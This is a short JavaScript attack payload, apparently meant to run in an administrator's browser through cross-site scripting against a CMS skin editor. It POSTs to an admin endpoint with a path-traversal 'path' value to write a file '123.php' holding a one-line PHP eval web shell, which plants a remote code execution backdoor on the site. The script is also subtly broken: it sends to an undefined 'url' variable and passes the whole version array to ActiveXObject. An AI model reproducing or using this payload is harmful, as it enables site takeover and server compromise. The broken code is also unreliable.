var request = false;
if (window.XMLHttpRequest) {
    request = new XMLHttpRequest();
    if (request.overrideMimeType) {
        request.overrideMimeType('text/xml');
    }
} else if (window.ActiveXObject) {
    var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0',

        'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'
    ];
    for (var i = 0; i < versions.length; i++) {
        try {
            request = new ActiveXObject(versions);
        } catch (e) {}
    }
}
xmlhttp = request;
thisTHost = top.location.hostname;
thisTHost = "http://" + thisTHost + "/admin/skins/skins.php?ac=xgmb&op=go&path=../../skins/index/html/";
var params = 'name=123.php&content=<?php @eval($_POST[123]);?>';
xmlhttp.open("POST", url, true);
xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xmlhttp.setRequestHeader("Content-length", params.length);
xmlhttp.setRequestHeader("Connection", "Keep-Alive");

xmlhttp.send(params);